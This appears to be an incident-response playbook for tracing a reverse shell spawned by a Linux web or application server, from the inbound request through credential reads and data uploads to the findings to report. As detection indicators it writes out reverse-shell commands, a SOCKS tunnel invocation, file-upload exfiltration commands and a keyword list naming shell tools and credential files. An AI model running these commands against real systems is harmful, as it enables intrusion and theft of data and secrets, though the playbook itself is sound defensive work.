---
name: Linux server intrusion through a web application
description: How to trace a shell spawned by a web or application server on Linux, from the request that caused it to the data that left, and what to report.
entity_types: linux_process
keywords: linux webshell reverse shell bash -i /dev/tcp php-fpm uwsgi gunicorn apache nginx java tomcat jetty node sudo setuid pgpass shadow mysql psql pg_dump tar curl wget upload socks chisel tunnel /tmp /var/tmp /dev/shm loginuid
---
On a Linux server a shell (bash, sh, zsh, dash) or a tool (curl, wget, psql, mysql, python, perl, nc) whose ancestor is a web or application server worker (php-fpm, uwsgi, gunicorn, apache2, nginx, java, node) is the classic sign of remote code execution. An unset loginuid (4294967295) means no human logged in: the process came from the service, not from an administrator's session. Daemons started by systemd (parent pid 1) that only accept ordinary requests are not this.

Check, in this order:
1. Entry: the inbound connection to the application seconds before the shell, and its source host and address (often external or a hop such as a proxy).
2. Shell and channel: the shell's command line (`bash -i &>/dev/tcp/<ip>/<port>`, `nc -e`, `python -c socket`) and the outbound connection it opened; a downloaded binary run as `client <ip>:<port> R:socks` or similar is a tunnel to the attacker.
3. Foothold and privilege: scripts or binaries written by the service account into the application directory, /tmp, /var/tmp or /dev/shm and then run, especially through `sudo` or a setuid transition to root (euid 0).
4. Credentials: files the shell read that hold secrets — `.pgpass`, `.my.cnf` or `--defaults-extra-file`, application config and `.env` files, `/etc/shadow`, SSH keys. Every account whose secret was read is exposed: find the account those secrets belong to (database or application account, service account) by searching its name.
5. Impact and reach: database dumps (`psql \copy`, `mysqldump`, `mysql -e`), archives built from them, uploads (`curl -T`, `curl -X POST -F file=@`, `wget --post-file`), and any second host reached through the tunnel or the stolen credentials.

Report: the compromised host(s) as host_to_isolate; the service account the shell ran as and every account whose credentials were read or used as identity_to_rotate (application and database accounts included); the attacker's dropped scripts, downloaded binaries and tunnels as file_to_delete; the attacker's external endpoints (the source of the exploit request and the upload or C2 destination) as network_block; the shell and the processes that did something with an effect (privilege change, credential read, dump, upload) as process_observed. Do not report reconnaissance commands (id, whoami, hostname, uname, ip a, ss) as artifacts, and treat dumped tables, archives of victim data and credential files as evidence, not files to delete.
